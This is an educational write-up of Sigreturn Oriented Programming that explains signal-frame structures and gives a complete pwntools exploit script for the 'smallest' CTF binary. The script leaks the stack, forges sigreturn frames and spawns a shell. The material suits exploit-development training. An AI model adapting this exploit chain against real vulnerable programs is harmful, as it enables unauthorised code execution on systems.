# Sigreturn Oriented Programming (SROP)

SROP was published by Erik Bosman from Vrije Universiteit Amsterdam in 2014.
* [paper](http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf)
* [slides](https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf)

## Concept
### Signal handling
Signal handling is a mechanism in UNIX systems for processes to communicate with each other. During signal handling, firstly, there will be a context save of the current process, then the signal handler is executed, and finally the context is restored and execution continues as normal.

![signal handling](https://raw.githubusercontent.com/nush-osi-layer-8/pwn/master/srop/images/signal-handling-context.png)

### Context
The **context** is just all the registers and some other information that represent the current state of the process. To be more precise, here are the `sigcontext` for x86 and x64.

* x86
```
struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```

* x64
```
struct _fpstate
{
  /* FPU environment matching the 64-bit FXSAVE layout.  */
  __uint16_t        cwd;
  __uint16_t        swd;
  __uint16_t        ftw;
  __uint16_t        fop;
  __uint64_t        rip;
  __uint64_t        rdp;
  __uint32_t        mxcsr;
  __uint32_t        mxcr_mask;
  struct _fpxreg    _st[8];
  struct _xmmreg    _xmm[16];
  __uint32_t        padding[24];
};

struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```

The way they are being stored is very simple, they are all pushed onto the stack.

```
| sigreturn |   <--- sp
|  siginfo  |
|  ucontext |
|   stack   |
```

siginfo and ucontext here are what we call the signal frame, and sigreturn is just the return address to a `sigreturn` instruction.

In short, 
* before running the signal handler - context is being pushed onto the stack
* after finish executing the signal handler - context is being popped off the stack

(all of these is learnt in NUSH CS Honours Operating Systems course :P)

### Sigreturn
The interesting thing here is the context restore part, which is being done by the `sigreturn` instruction. It is very simple, just pop off the context from the stack and fill in the respective registers with what's in it.

Why is this useful?
* `sigreturn` reads off the stack, which we have control off
* `sigreturn` does not validate the integrity of the context in the stack

Once we are able to get the values we want onto the registers, we can then return to a `syscall` instruction, which means we can do anything we want.

The `sigreturn` instruction can also be accessed via syscall number 15.

## Exploit
The steps of performing this exploit is pretty simple, 
* Leak stack address
* Write signal frame into stack
* Return to `sigreturn` instruction
* Return to `syscall` instruction

However, there are some conditions
* Large input (a signal frame is about 248 bytes, constructed using pwntools for 64 bit)
* At least a `syscall` gadget

### Use cases
* When in a statically linked binary we cannot return to libc
* We don't have enough gadgets to control the registers we want for syscalls

## Example
### Challenge
We will use a challenge from 360春秋杯, [smallest-pwn](https://github.com/nush-osi-layer-8/pwn/raw/master/srop/smallest).
(this is pretty much just a rewrite of [this](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/advanced_rop/#srop) in English)

Disassembly of the binary shows that it really is very small.

```
/ (fcn) entry0 17                                   
|   entry0 ();                                        
|           0x004000b0      4831c0         xor rax, rax      			
|           0x004000b3      ba00040000     mov edx, 0x400
|           0x004000b8      4889e6         mov rsi, rsp                                          
|           0x004000bb      4889c7         mov rdi, rax 
|           0x004000be      0f05           syscall 
\           0x004000c0      c3             ret                      
```

Really, this is all we have. All input that we pass in is a ROP chain for the program to execute.

We do not have a libc to return to, and we do not have gadgets to control `rax`, `rdi`, `rsi` and `rdx` to prepare a `execve("/bin/sh", 0, 0)` system call. So, we have to use SROP for this.

First, prepare our exploit script.

```python
from pwn import *
from LibcSearcher import *

binary_name = './smallest'

p = process(binary_name)
context.arch = 'amd64'	# must be here or pwntools will give an error when using SigreturnFrame

entry = 0x4000b0
syscall_ret = 0x4000be
```

We prepare the stack to have 3 copies of the address to the entry point, we'll see later why.

```python
payload = p64(entry) * 3
p.send(payload)
```

Our stack is now

```
0x4000b0|0x4000b0|0x4000b0|rest of the stack
```

First read, we want to modify the next `0x4000b0` on the stack to be `0x4000b3`. Doing this sets `rax=1`, as `read` sets `rax` to be the number of bytes read. Also, this allows us to skip over the `xor rax, rax` instruction, allowing us to dump `0x400` bytes from the stack by calling `write(0, rsp, 0x400)` instead of `read`.

```python
p.send('\xb3')
```

Our stack is now

```
0x4000b3|0x4000be|rest of the stack
```

So, we get a dump of the stack, which contains a lot of stack addresses.

```python
stack_addr = u64(p.recv()[8:16])
log.success('Found stack addr: 0x%x' % stack_addr)
```

Now our stack is

```
0x4000be|rest of the stack
```

We get another `read` from the service, so we craft a `SigreturnFrame` using pwntools, and send it in. We can't use `execve` first, because we need to pivot the stack to be the stack address we leaked earlier, so that we have control of where `'/bin/sh'` is.

```python
# sigframe for read(0, new_stack_addr, 0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(entry) + 'a' * 8 + str(sigframe)
p.send(payload)
```

We will need another address to the entry point on the stack, and 8 more padding bytes, so that we can read in 15 bytes later, making `rax=15`, which is the syscall number for `sigreturn`.

```python
# send 15 bytes so that rax=15
sigreturn = p64(syscall_ret) + 'a' * 7
p.send(sigreturn)
```

Notice here that this time the payload has 7 bytes eating into the `SigreturnFrame`, but that's fine, because the important information are all near to the middle of the frame.

We do the same thing but this time with `execve`.
```python
# same thing, sigframe for execve('/bin/sh', 0, 0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(entry) + 'a' * 8 + str(sigframe)
payload += (0x120 - len(payload)) * 'a' + '/bin/sh\x00'
p.send(payload)

# then sigreturn
p.send(sigreturn)

p.interactive()
```

And we get shell!

## References
* https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/advanced_rop/#srop
* http://www.reshahar.com/2017/05/04/360%E6%98%A5%E7%A7%8B%E6%9D%AFsmallest-pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/